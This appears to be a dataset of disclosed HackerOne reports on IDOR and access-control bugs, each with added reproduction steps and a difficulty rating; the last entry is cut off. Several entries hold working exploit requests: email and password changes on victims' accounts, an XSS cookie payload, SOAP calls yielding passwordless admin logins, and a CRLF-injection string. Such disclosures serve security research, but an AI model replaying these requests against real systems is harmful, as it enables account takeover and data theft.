https://███████ is a Social Network Site belonging to US DoD. Membership is open to anyone, I have found a method to fully take-over any members' account by exploiting an IDOR bug in the ██████████ end-point. By changing the following values in the POST request to the affected end-point:
userName
originalEmail
Email
RecoveryEmail
I am able to add Recovery Email address of my choice, thus, enabling me to send a password reset link to my attacker controlled email address. I have uploaded a video PoC to demo my finding. Note that the following test accounts were used:
Attacker
login: ████████
Victim
login: ███████
I added ████ email into the victim account. Note that this only works on victims that have no recovery email address defined or recovery email that are not yet verified. This technique will NOT work on victims' that already have a confirmed recovery email address.
Also note, that I am using multi-containers plugin for Firefox, therefore, each tab represents separate browser session. Finally, note that in my PoC video, I had to insert the victim recovery email link ████████/self?guid=█████████ into the attackers' session because a valid session is required to validate the email. The session does not necessary have to belong to the victims' session to validate.
The IDOR bug can be obtained by intercepting the 2-FA Authentication switch:
███
Vulnerable End-Point
Here is the vulnerable POST request when captured, the cookies and __RequestVerificationToken must be valid for this attack to work, I have highlighted the vulnerable IDOR parameters:
POST /self HTTP/1.1
Host: █████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://███/self
Content-Type: application/x-www-form-urlencoded
Content-Length: 739
Connection: close
Cookie: ███████-Http-Session=███; ga=█████; _gid=███; AWSALB=█████; AWSALBCORS=████; ASP.NET_SessionId=██████████; BIGipServer~Sync_Only~passport_pool=█████; akaalb_albcustom=█████████████def~id=██████████; AWSALB=███; AWSALBCORS=██████; googtrans=/en/en; googtrans=/en/en; UserName=███████████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-███; _gat███Tracker=1; RequestVerificationToken_Lw=█████
Upgrade-Insecure-Requests: 1
__RequestVerificationToken=█████████&userName=████&originalEmail=████████%40gmail.com&oldPassword=&EmailSent=False&RecoveryEmailSent=true&RecoveryEmailVerified=true&SecurityImagePath=&Translate=en&COIGroupID=&Username=█████████&Email=██████████%40gmail.com&ConfirmEmail=&RecoveryEmail=██████████&ConfirmRecoveryEmail=&NewPassword=&ConfirmPassword=&TwoFactorAuthenticationEnabled=false&Password=&Password=&Password=&Password=&Password=
Impact
An attacker can add his email address into the recovery field of any █████████ member that has not yet defined or verified a Recovery Email address. He will then be able to force a password reset link to be sent to his email address and change the victims' password and login into victims' account. Attacker now has full control of victims' account.
Also, victim login id is easily retrievable from this end point. By running the RequesteeId using any valid user session, attacker is able to retrieve the ProfileUrl containing the victims' login id.
Request
POST /api.ashx/v2/users/████/friends.json HTTP/1.1
Host: █████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization-Code: █████████
Rest-Authorization-Code: █████████
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: https://████
Connection: close
Referer: https://████/members/███/
Cookie: _ga=███████; _gid=██████████; AWSALB=█████████; AWSALBCORS=█████; █████████-Http-Session=█████████; googtrans=/en/en; UserName=█████████,█████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-████; akaalb_albcommunity=██████████; AuthorizationCookie=███; BIGipServer~Sync_Only~community_pool=██████████
RequesteeId=███████&RequestMessage=+
Reply:
{
"Friendship": {
"CreatedDate": "2020-04-11T08:22:53.247",
"FriendshipState": "Pending",
"LastModifiedDate": "2020-04-11T08:22:53.247",
"RequestMessage": " ",
"RequestorId": ██████,
"RequesteeId": █████,
"User": {
"AvatarUrl": "https://████████/cfs-file/__key/system/images/anonymous.gif",
"DisplayName": "█████",
"ProfileUrl": "https://████/members/███████",
"Username": "██████████",
"CurrentStatus": null,
"Id": █████████
},
"Id": ███
},
"Info": [],
"Warnings": [],
"Errors": []
}
Therefore, attacker just needs to feed the login id into the vulnerable end-point and follow the steps outlined in the PoC video to take over thousands of ██████████ user accounts!



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to take over any member's account on a US DoD social network site by exploiting an IDOR (Insecure Direct Object Reference) bug. By manipulating specific parameters in a POST request, the attacker can add their own recovery email to the victim's account, enabling them to reset the password and gain full control. This works only if the victim has no recovery email or an unverified one.

Steps to Reproduce:
1. Intercept the 2-FA Authentication switch request to capture the vulnerable POST request.
2. Modify the POST request parameters (userName, originalEmail, Email, RecoveryEmail) to add a recovery email controlled by the attacker.
3. Send the modified POST request to the vulnerable endpoint to update the victim's recovery email.
4. Trigger a password reset to the attacker-controlled recovery email to gain full account access.
Exploitation Difficulty:
The attack involves multiple steps including intercepting a request, modifying parameters, and triggering a password reset. It requires understanding the application's state and the interaction between different components (2-FA switch, recovery email validation). However, the steps are straightforward once the vulnerable endpoint is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/854290: IDOR on update user preferences
================================================================================
RAW DESCRIPTION:

Summary:
Team member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.
Steps To Reproduce:
Login in as user1 (the user with role admin) and invite user2 (set his role to user).
Login in as user2, open Mail tab and select user1 from Conversation assignment dropdown (see s1.jpg (F796149) attachment).
Open network tools in the browser devTools or open local proxy and copy UserUuid (da4f313f-e21e-4b5f-b2da-42d9864716f6 in my case) of the user1 from the following request: https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6.
Use template request1 to create http request. Change {user1-uuid} to user1 Uuid, {user2-cookie} to user2 cookie. In the request body: {attacker-email} to email controlled by user2, signature to the following: <p style=\"margin:0;\">User Signature2<img src=x onerror=alert(document.cookie) ></p>. Send request.
Login in as user1. Open https://app.outpost.co/settings/preferences, alert with user1 cookie will appear (see s2.jpg (F796148) attachment).
Open https://app.outpost.co/sign-in/help and paste {attacker-email}. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.
Supporting Material/References:
request1 template:
Code 896 Bytes
1PUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0
2Host: api.outpost.co
3Content-Length: 434
4Sec-Fetch-Dest: empty
5X-Requested-With: XMLHttpRequest
6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
7Dnt: 1
8Content-Type: application/json
9Accept: */*
10Origin: https://app.outpost.co
11Sec-Fetch-Site: same-site
12Sec-Fetch-Mode: cors
13Referer: https://app.outpost.co/
14Accept-Encoding: gzip, deflate, br
15Accept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7
16Cookie: auth={user2-cookie}
17
18{
19  "firstName": "user1-changed-by-user2",
20  "lastName": "null",
21  "email": "{attacker-email}",
22  "role": "USER",
23  "defaultMailboxUuid": "",
24  "mailboxUuids": [
25    "e4a63ae3-bb10-46f8-be28-a2660a2344ec"
26  ],
27  "signature": "{signature}",
28  "timezone": "Europe/Moscow",
29  "defaultSendAndResolve": false,
30  "selectFirstConversation": true
31}
Impact
An attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability allows a user with USER role to modify any user's preferences, including injecting malicious scripts to steal cookies or hijack accounts via the password reset function.

Steps to Reproduce:
1. Login as user1 (admin) and invite user2 with USER role.
2. Login as user2, access Mail tab, and select user1 from Conversation assignment dropdown.
3. Extract user1's UserUuid from the network request.
4. Use the template request to send a PUT request to update user1's preferences, including a malicious signature.
5. Login as user1 and trigger the XSS payload to steal cookies.
6. Use the forget password function with the attacker's email to hijack user1's account.
Exploitation Difficulty:
The attack involves multiple steps including session manipulation, XSS payload injection, and account takeover via password reset. The interaction between these components is non-obvious, requiring the attacker to understand and chain several vulnerabilities together.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/888729: Read-Only user can delete users
================================================================================
RAW DESCRIPTION:

hello
this endpoint (DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8 )vulnerable to Insecure Direct Object Reference
Steps to reproduce the bug
Let's assume that three accounts exist:
admin@helium.com (role Administrator)
attacker@helium.com (role Read-Only)
victim@helium.com (invited user )
all three account in same organization (h1)
attacker@helium.com cant delete victim@helium.com but we can do that
from admin@helium.com go to delete victim@helium.com
request like that DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8
take id victim@helium.com 0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8
go to attacker@helium.com switch another organization (h2)
and go to delete invited user from this organization(h2)
DELETE /api/invitations/a996881d-7177-43fb-be7c-da3a6b005f40
change id (a996881d-7177-43fb-be7c-da3a6b005f40) to id you got from admin@helium.com(0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8)
respond
HTTP/1.1 204 No Content
Date: Mon, 01 Jun 2020 18:47:43 GMT
Content-Length: 0
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Message: User removed from organization
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
cf-request-id: 0312cf14d40000edeb299e9200000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 59cb1ace2eeaedeb-CDG
now account victim@helium.com deleted from attacker@helium.com
i can make poc
thanks
Impact
Read-Only user can delete users



================================================================================
Vulnerability Description:
A Read-Only user can delete users due to an Insecure Direct Object Reference (IDOR) vulnerability. The attacker exploits the lack of proper authorization checks by reusing a victim's ID from a different organization in a DELETE request, allowing unauthorized deletion.

Steps to Reproduce:
1. Identify three accounts in the same organization (h1): admin@helium.com (Administrator), attacker@helium.com (Read-Only), victim@helium.com (invited user).
2. From admin@helium.com, attempt to delete victim@helium.com and capture the DELETE request: DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8.
3. Switch to attacker@helium.com in another organization (h2) and attempt to delete a user there, capturing the DELETE request: DELETE /api/invitations/a996881d-7177-43fb-be7c-da3a6b005f40.
4. Modify the request from attacker@helium.com to use the victim's ID (0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8) instead of the original ID.
5. Observe the response: HTTP/1.1 204 No Content, indicating successful deletion of victim@helium.com by the Read-Only user.
Exploitation Difficulty:
The vulnerability involves understanding the IDOR flaw and manipulating the request to use a victim's ID. However, the steps are straightforward once the ID is known, and the attack does not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/915114: IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal
================================================================================
RAW DESCRIPTION:

Summary:
<image_0>
Steps To Reproduce:
Log-in to your team account at CrowdSignal
Go to https://app.crowdsignal.com/users/invite-user.php?id=19920465&popup=1
You will see my email, and if you click Update Permissions, you will takeover my account.
You can change the user ID to random number with 00010006 - 19920500 range.
Impact
IDOR leads to account takeover without user interaction
Thanks,
Bugra



================================================================================
Vulnerability Description:
This is an Insecure Direct Object Reference (IDOR) vulnerability in CrowdSignal's user invitation system. By manipulating the 'id' parameter in the URL, an attacker can access and modify the permissions of other users without proper authorization, leading to account takeover without any user interaction.

Steps to Reproduce:
1. Log-in to your team account at CrowdSignal
2. Navigate to https://app.crowdsignal.com/users/invite-user.php?id=19920465&popup=1 (or modify the ID parameter to a value within the range 00010006 - 19920500)
3. Observe that you can view and modify another user's permissions, leading to account takeover
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires modifying a URL parameter (ID) within a predictable range. There are no complex interactions, state manipulations, or novel logic involved. The attack surface is simple and follows common IDOR patterns.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/915127: IDOR when moving contents at CrowdSignal
================================================================================
RAW DESCRIPTION:

Summary:
Hi team,
You can move your contents via Move to button at https://app.crowdsignal.com/dashboard
And when you click to Move to > My Content you will send a POST request to /dashboard like that :
<image_0>
actionable[] parameter's value is the content's ID. And if you change this ID to victim's content ID, you will see victim's content at My Content page. But you can't see responses or edit it. You can only change status etc if you have a free account.
So I found another way to takeover victim's content completely via team account.
In team accounts, you have another move option that named Move to another user. Basically, you can move your contents to users (in your team) .
And if you follow same steps again but with Move to another user option, you can see victim's content in your team user's account.
Please note, content IDs are sequential, so attacker can takeover any content.
Steps To Reproduce:
With Free account (limited access to victim's content)
Go to https://app.crowdsignal.com/dashboard
Click to checkbox on your any content and turn on Intercept at Burp Suite
Click to Move to > My Content
And change actionable[] parameter's value with victim's content ID.
Go to My Content.
Go to https://app.crowdsignal.com/dashboard
Click to checkbox on your any content and turn on Intercept at Burp Suite
Click to Move to > My Content
And change actionable[] parameter's value with victim's content ID.
Go to My Content.
With Team account (full access to victim's content)
Add your second email on https://app.crowdsignal.com/users/list-users.php and confirm it
Go to https://app.crowdsignal.com/dashboard
Click to checkbox on your any content and turn on Intercept at Burp Suite
Click to Move to > Move to another user
Select your second account, click Move
Change actionable[] parameter's value with victim's content ID.
Go to your second account and check dashboard
Add your second email on https://app.crowdsignal.com/users/list-users.php and confirm it
Go to https://app.crowdsignal.com/dashboard
Click to checkbox on your any content and turn on Intercept at Burp Suite
Click to Move to > Move to another user
Select your second account, click Move
Change actionable[] parameter's value with victim's content ID.
Go to your second account and check dashboard
PoC video for full access to victim's content:
Impact
IDOR leads to takeover victim's content
Thanks,
Bugra



================================================================================
Vulnerability Description:
IDOR vulnerability in CrowdSignal allows an attacker to move victim's content to their own account or another user's account within a team, leading to unauthorized access and potential takeover of the content.

Steps to Reproduce:
1. Go to https://app.crowdsignal.com/dashboard
2. Click to checkbox on your any content and turn on Intercept at Burp Suite
3. Click to Move to > My Content
4. Change actionable[] parameter's value with victim's content ID
5. Go to My Content
6. Repeat steps with Move to another user option for full access
Exploitation Difficulty:
The vulnerability involves manipulating content IDs in a POST request, which is a straightforward IDOR. However, the attack requires understanding the difference between free and team accounts and the sequential nature of content IDs, adding some complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/950881: IDOR when editing email leads to Account Takeover on Atavist
================================================================================
RAW DESCRIPTION:

Summary:
Hi team,
I created an account on Atavist and checked my settings page.
I can change my email at https://magazine.atavist.com/cms/reader/account with this request :
<image_0>
And as you can see, there is a id parameter on request data. It's our user ID, and it's vulnerable for IDOR. So we can change any user's email address.
Also user IDs are sequential so an attacker can change all accounts' email.
Steps To Reproduce:
1.Go to https://magazine.atavist.com/login and Login to your account
Go to https://magazine.atavist.com/cms/reader/account and open your proxy program
Change the email and click Save
In request, change the ID to your test account's ID
Forward the request
Now you can reset victim's password via https://magazine.atavist.com/forgot
Impact
Account Takeover without user interaction
Thanks,
Bugra



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) in the email change functionality, allowing an attacker to modify any user's email address by manipulating the 'id' parameter in the request. Since user IDs are sequential, this can lead to mass account takeovers.

Steps to Reproduce:
1. Go to https://magazine.atavist.com/login and log in to your account.
2. Navigate to https://magazine.atavist.com/cms/reader/account and open your proxy program.
3. Change the email and click Save.
4. In the request, modify the 'id' parameter to another user's ID (sequential IDs make this easy).
5. Forward the request to change the victim's email.
6. Use the password reset feature at https://magazine.atavist.com/forgot to take over the victim's account.
Exploitation Difficulty:
The attack is straightforward, involving only the manipulation of a single parameter in a predictable request. No complex interactions or novel logic are required, and the sequential nature of IDs makes enumeration trivial.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/969223: IDOR to Account Takeover on https://████/index.html
================================================================================
RAW DESCRIPTION:

Hello Team!
Summary:
I found when you wish to update your profile on https://███████/ after your login through https://██████████/signIn/signIn.html website due to an IDOR.
This IDOR gives you the opportunity to change the origin email for the registered account by changing the ID parameter on the following request, i assume that if i would do it on the id=1 i would takeover the admin account, this is due to not requiring the OLD password to make an email change, aswell as no restriction to make POST actions on different account IDS.
Description:
IDOR chained to full Account Takeover on ██████ domain.
Account
## Step-by-step Reproduction Instructions
Register an account at https://█████████/signIn/CreateAccount.html (Attacker)
Login to your account and go the https://███████/signIn/account page
Click on the "update" button located at thetop middle, and capture the request on BURP
Now change the ID parameter on the request to the victims, change the email, and you successfully have managed to switch his email.
Request:
███
Video PoC:
█████
Suggested Mitigation/Remediation Actions
Implementing email request change based on OLD password input
Returning 403/401 when user account attempts to change another user ID settings.
Disclaimer
as you might notice the domain is https://██████/signIn/signIn.html when you sign in (.mil site), and it redirects you afterwards to https://██████████/ with the Compromised account, therefore i considered this In Scope.
Best Regards,
Nagli
Impact
Issuing the malicious request on the victim account ID will lead to account takeover by replacing the email of the victim with the email of the attacker, and requesting a new password using the Forgot password option.



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) that allows an attacker to change the email address of any user account by manipulating the ID parameter in a profile update request. This leads to account takeover as the attacker can then use the 'forgot password' feature to gain control of the victim's account.

Steps to Reproduce:
1. Register an account at the target website (Attacker)
2. Login to the account and navigate to the profile update page
3. Intercept the profile update request using a proxy tool like Burp Suite
4. Modify the ID parameter in the request to target a victim's account ID
5. Change the email address in the request to the attacker's email
6. Submit the modified request to takeover the victim's account
Exploitation Difficulty:
The attack involves straightforward manipulation of a request parameter (ID) and does not require complex interactions between components or understanding of novel logic. The vulnerability is a common IDOR flaw with a clear exploitation path.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/974222: IDOR leads to Edit Anyone's Blogs / Websites
================================================================================
RAW DESCRIPTION:

Hello there,
I hope all is well!
Steps:
Go to https://intensedebate.com/signup and create 2 accounts.
Login as victim and go to https://www.intensedebate.com/edit-user-profile
Click Add Blog / Website text and fill the form > click Save Settings button
<image_0>
Then login as attacker.
Go to https://www.intensedebate.com/edit-user-profile > click Add Blog / Website text and fill the form > click Save Settings button
Go to https://www.intensedebate.com/edit-user-profile, again and click Save Settings button > open burp suite and change hidBlogID parameter with victim's hidBlogID.
Forward the request and go to victim's account. Check your website informations. You will see it's changed.
Impact
Changing victim's website/blog informations.
Best Regards,
@mygf



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability allows an attacker to modify another user's blog/website information by manipulating the 'hidBlogID' parameter in a request.

Steps to Reproduce:
1. Create two accounts on https://intensedebate.com/signup
2. Log in as the victim and navigate to https://www.intensedebate.com/edit-user-profile
3. Click 'Add Blog / Website', fill the form, and save settings
4. Log in as the attacker and repeat step 3
5. Navigate to the same profile edit page again and open Burp Suite
6. Intercept the request and modify the 'hidBlogID' parameter to the victim's 'hidBlogID'
7. Forward the request and verify the victim's website/blog information has been changed
Exploitation Difficulty:
The vulnerability involves straightforward parameter manipulation without requiring deep understanding of complex application states or novel logic. The steps are linear and do not involve subtle interactions between components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/978768: Adding everyone to the repo due to the lack of rate limit
================================================================================
RAW DESCRIPTION:

Summary
Since there is no rate limit in the inviting users to the repository section, it is possible to add all users on gitlab to a repository.
Steps to reproduce
(Step-by-step guide to reproduce the issue, including:)
Create a repository
go to the project members section
choose a random user
before clicking the invite button, we need to capture the request with the burp suite..
███████
Send it to the Intruder module, specify the █████ field here between 1 and 7006996 and send the request.
Impact
It is possible to collect all users on Gitlab in a single repository, so users' mailboxes will be filled with notifications.
Note
Because the rate limit is out of scope, I tested it and I could not stop the python script, and there were users affected.
Impact
It is possible to collect all users on Gitlab in a single repository, so users' mailboxes will be filled with notifications.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to add all users on GitLab to a single repository due to the lack of rate limiting in the user invitation feature. This can flood users' mailboxes with notifications and potentially cause denial of service.

Steps to Reproduce:
1. Create a repository
2. Go to the project members section
3. Choose a random user and capture the invite request with Burp Suite
4. Send the request to the Intruder module, specifying the user ID field with a range from 1 to 7006996
5. Execute the attack to add all users to the repository
Exploitation Difficulty:
The attack is straightforward and involves a single component (the user invitation feature) with no complex interactions or state manipulations. The lack of rate limiting is a common issue and the attack method is not novel.

--------------------------------------------------------------------------------



Improper Access Control - Generic Vulnerabilities (71 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1026146: Unauthorized access to admin panel of the Questionmark Perception system at https://██████████
================================================================================
RAW DESCRIPTION:

Summary:
Due to the lack of access control, an anonymous attacker can compromise the administrator account on the Questionmark Perception system.
Description:
By using the service description which publicly accessible on the internet, and by bypassing the access control, an anonymous attacker can (ab)use the method provided by the system and get the administrator access on the Questionmark Perception system.
Step-by-step Reproduction Instructions
Visit https://██████/█████████ to get all the Questionmark Web Integration Services' description.
████
The method GetAdministratorList returns a list giving the full details of all the administrators in the database, as described in https://███████/███?████
████████
Issuing the request shown above, but remove all the code between the <soapenv:Header> and the </soapenv:Header> tag like the request below:
Code 478 Bytes
1POST /███ HTTP/1.1
2Host: ████
3Content-Type: text/xml; charset=utf-8
4Content-Length: 328
5SOAPAction: "http://questionmark.com/QMWISe/GetAdministratorList"
6
7<?xml version="1.0" encoding="utf-8"?>
8<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
9  <soap:Body>
10    <GetAdministratorList xmlns="http://questionmark.com/QMWISe/" />
11  </soap:Body>
12</soap:Envelope>
The response shows us a list giving the full details of all the administrators in the database, included Administrator_ID, Administrator_Name, Email,...
█████
The method GetAccessAdministrator processes an Administrator Name and returns a URL that enables the administrator to log in to Enterprise Manager (without using a password) if the administrator exists, so using the information we got above, we can (ab)use this method to get access to an administrator account.
Code 576 Bytes
1POST /███████ HTTP/1.1
2Host: ██████████
3Content-Type: text/xml; charset=utf-8
4Content-Length: 416
5SOAPAction: "http://questionmark.com/QMWISe/GetAccessAdministrator"
6
7<?xml version="1.0" encoding="utf-8"?>
8<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
9  <soap:Body>
10    <GetAccessAdministrator xmlns="http://questionmark.com/QMWISe/">
11      <Administrator_Name>au_eliut</Administrator_Name>
12    </GetAccessAdministrator>
13  </soap:Body>
14</soap:Envelope>
The response gives us a link to login without using a password.
Code 867 Bytes
1HTTP/1.1 200 OK
2Cache-Control: private, max-age=0
3Content-Type: text/xml; charset=utf-8
4Server: 0
5X-AspNet-Version: 2.0.50727
6Strict-Transport-Security: max-age=63072000;includeSubDomains;preload
7Date: Wed, 04 Nov 2020 18:18:46 GMT
8Content-Length: 565
9Set-Cookie: BIGipServer████████████████ path=/; Httponly; Secure
10
11<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetAccessAdministratorResponse xmlns="http://questionmark.com/QMWISe/"><URL>https://█████████/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=db69772f40b1a71179fd96e1bceebed003f3049e03a78e7d009c4627d387da2c</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>
12
██████████
Using the link above: https://██████████/████████ to login as admin.
████████
Suggested Mitigation/Remediation Actions
Remove the service description at https://██████/█████████
Re-configure the system, to deny all the request without the SOAP "Trust" header.
Impact
Incorrect access restriction to the authorized interface of the site leads to information leakage. As Questionmark describes, an admin can view all fields of the questions, the results, and personal information of the participants.
For example, issuing the request below to get all the participants' information such as username, password,...
Code 480 Bytes
1POST /██████ HTTP/1.1
2Host: ███████
3Content-Type: text/xml; charset=utf-8
4Content-Length: 326
5SOAPAction: "http://questionmark.com/QMWISe/GetParticipantList"
6
7<?xml version="1.0" encoding="utf-8"?>
8<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
9  <soap:Body>
10    <GetParticipantList xmlns="http://questionmark.com/QMWISe/" />
11  </soap:Body>
12</soap:Envelope>
█████



================================================================================
Vulnerability Description:
The vulnerability allows an anonymous attacker to bypass access controls in the Questionmark Perception system, retrieve administrator details via a SOAP request, and gain unauthorized admin access by obtaining a password-less login URL.

Steps to Reproduce:
1. Visit the Questionmark Web Integration Services' description URL to get service details.
2. Send a SOAP request to GetAdministratorList without the SOAP header to retrieve admin details.
3. Use the retrieved administrator name to send a SOAP request to GetAccessAdministrator to obtain a login URL.
4. Use the provided URL to log in as an administrator without a password.
Exploitation Difficulty:
The attack involves understanding SOAP API interactions and manipulating requests to bypass authentication, but the steps are straightforward once the API endpoints are known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1058015: Full account takeover on https://████████.mil
================================================================================
RAW DESCRIPTION:

Description
The flow in application is to sign up and wait for an email containing a one-time password, as soon as you login using that password, it asks you to change it. I took that password change request and applied on any email changing their password and it worked
Steps to produce:
1- Copy the following request: (note txtEMail and txtNewPassword parameters)
Code 699 Bytes
1POST /Login.aspx HTTP/1.1
2Host: ██████████.mil
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/x-www-form-urlencoded
8Content-Length: 1052
9Origin: https://█████.mil
10Connection: close
11Referer: https://██████.mil/Login.aspx
12Upgrade-Insecure-Requests: 1
13
14__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=████&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=█████████&txtMail=&txtEMail=[VICTIM_EMAIL]&reqEMailE_ClientState=&revEMailE_ClientState=&txtNewPassword=[DESIRED_PASSWORD]&btnNewPassword=Submit
2- Now, log in using any victim email with a random password and intercept the request at https://█████.mil/Login.aspx
3- Paste the request you copied above and change the txtEMail (to victim email) and txtNewPassword parameters and send it.
Impact
Full account takeover on any user.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to change any user's password without authentication by intercepting and modifying a password change request. This leads to a full account takeover.

Steps to Reproduce:
1. Copy the request from the application, noting the txtEMail and txtNewPassword parameters.
2. Intercept a login request for any victim email and modify the txtEMail and txtNewPassword parameters to change the victim's password.
Exploitation Difficulty:
The attack is straightforward, involving only the interception and modification of a single request. It does not require understanding complex application states or novel logic, making it easy to discover and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1061664: Access to alerta.khanacademy.org leak sensitive data 
================================================================================
RAW DESCRIPTION:

Hi ,
I found to access https://alerta.khanacademy.org/ using signup bypass.That leak access to sensitive data of khanacademy.org
Step To Reproduce:
Go to https://alerta.khanacademy.org/#/signup
Inspect Q and remove ng-hide
<image_0>
You got Signup Form. Signup account using anythings@khanacademy.org mail.
<image_1>
When you successfully signup,You access alerta.khanacademy.org without confirm email.
<image_2>
If you not login direct .
Go to alerta.khanacademy.org/#/login.
Inspect Q and remove ng-hide
<image_3>
Login with your register info.
<image_4>
Impact
Attacker can access alerta dashboard
Thanks,
@nightmare_msf



================================================================================
Vulnerability Description:
The vulnerability allows bypassing the email confirmation step in the signup process of alerta.khanacademy.org by manipulating the DOM to reveal hidden forms, leading to unauthorized access to the dashboard.

Steps to Reproduce:
1. Go to https://alerta.khanacademy.org/#/signup
2. Inspect the page and remove the 'ng-hide' class to reveal the signup form
3. Sign up using an email ending with @khanacademy.org
4. Access the dashboard without email confirmation
5. If not logged in directly, go to alerta.khanacademy.org/#/login
6. Inspect the page and remove the 'ng-hide' class to reveal the login form
7. Login with the registered credentials
Exploitation Difficulty:
The attack involves simple DOM manipulation to reveal hidden forms and does not require understanding complex application states or novel logic. The steps are straightforward and do not involve multiple components or subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1102780: bypassing dashboard without account + Information disclosure trough websockets 
================================================================================
RAW DESCRIPTION:

Sumarry :
I found a information disclosure for bypassing parameter url attacker can redirect to dashboard without login user/pass page
and websocket can be exposed in response/dashboard.
URL Effected
https://support.nextcloud.com/#password_reset
Steps To Reproduce:
Opened directory at https://support.nextcloud.com/#password_reset
Forget-password and repeat url to burp-suite
In directory added a parameter bypass is //%0d%0aSet-Cookie:%20crlf-injection=mickeybrew//
and look a responsive , you can be redirect to dashboard panel without user/pass
Show the network-browser and you can found api directory and websocket
Directory websocket is https://support.nextcloud.com/api/v1/signshow
Opened it and Boom You can see Information disclosure through websocket
Request
Code 227 Bytes
1GET #password_reset/%0d%0aSet-Cookie:%20crlf-injection=mickey HTTP/1.1
2Host: support.nextcloud.com
3Accept-Language: en-US,en;q=0.5
4Accept-Encoding: gzip, deflate
5Connection: close
6Upgrade-Insecure-Requests: 1
7Content-Length: 91
Screenshots POC
█████
██████
███████
███
Impact
It may cause the attacker to log into the dashboard page without logging in via user/pass, and the attacker finds sensitive files on open fires.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to bypass authentication and gain access to the dashboard without credentials by exploiting a CRLF injection in the URL. Additionally, the attacker can discover sensitive information through an exposed websocket endpoint.

Steps to Reproduce:
1. Navigate to https://support.nextcloud.com/#password_reset
2. Intercept the request in Burp Suite and modify the URL by adding the parameter: //%0d%0aSet-Cookie:%20crlf-injection=mickeybrew//
3. Observe the response and redirect to the dashboard without authentication
4. Inspect the browser's network tab to find the exposed websocket endpoint: https://support.nextcloud.com/api/v1/signshow
5. Access the websocket endpoint to view sensitive information
Exploitation Difficulty:
